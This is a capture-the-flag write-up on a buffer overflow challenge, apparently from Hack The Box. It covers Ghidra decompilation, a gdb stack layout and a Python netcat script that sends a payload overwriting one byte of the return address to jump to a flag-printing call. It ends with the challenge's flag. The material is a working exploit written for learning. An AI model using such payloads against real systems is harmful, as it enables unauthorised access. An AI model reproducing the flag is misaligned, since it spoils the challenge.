## Skills involved: Buffer overflow (return address overwrite)

As some with virtual no binary experience, it's surprising that I solved ANY of the binary-related challenges.

This program can be reversed by [Ghidra](https://ghidra-sre.org). Here is the part we're interested in:

```c
void admin_panel(long param_1,long param_2,long param_3){
  int iVar1;
  char local_38 [40];
  long local_10;
  
  local_10 = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld] .\n[*] If you want to continue, disable the mechanism or login as admin.\n"
         ,param_1,param_2,param_3);
  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
    printf(&DAT_004014e8);
    local_10 = read_num();
  }
  if (local_10 == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (local_10 != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
  read(0,local_38,0x39);
  if (((param_1 != 0xdeadbeef) || (param_2 != 0x1337c0de)) || (param_3 != 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
      goto LAB_00400b38;
    }
  }
  printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
  system("cat flag*");
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}
```
We're allowed to read 57 characters but the string can only store 40 characters. This smells like buffer overflow. 

I researched a lot on buffer overflow and while [this video](https://www.youtube.com/watch?v=V9lMxx3iFWU) helped a lot, it still doesn't click for me.

In the end using gdb, an executable debugging tool the visualization I needed. With some experimentation the stack structure can be shown (_ and ! denotes the space for password and menu option respectively):
```
0x7fffffffddc0:	0x00000000	0x00000000	0x00000003	0x00000000
0x7fffffffddd0:	0x00000002	0x00000000	0x00000001	0x00000000
0x7fffffffdde0:	0x________	0x________	0x________	0x________
0x7fffffffddf0:	0x________	0x________	0x________	0x________
0x7fffffffde00:	0x________	0x________	0x!!!!!!!!	0x00000000
0x7fffffffde10:	0xffffde40	0x00007fff	0x00400b94	0x00000000
```

With 57 characters we can overwrite the `94` part in `0x00400b94`, the return address of this function. Return address in a function tells the program which command to go to after completion.

<img width="637" alt="image" src="https://user-images.githubusercontent.com/26480299/169540786-601fbd0b-788a-4f7a-b4d9-22cb888abeb9.png">

We can go to 0x00400b01 with an appropriate payload (I used python to control the netcat connection):
```python
import nclib, string, time
nc = nclib.Netcat(( '**********', ***** ))
nc.recv_until('admin.\n')
payload = bytes("1", 'ascii')
#print(payload)
nc.send( payload ) 
response = nc.recv_until('Input: ')
payload = b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG\x01"
nc.send( payload )
response = nc.recv_all()
print(response)
```

**Flag: HTB{n0_n33d_2_ch4ng3_m3ch5_wh3n_u_h4v3_fl0w_r3d1r3ct}**

Remark: I spent a long time on this one because of misreading 0x39 as 39.
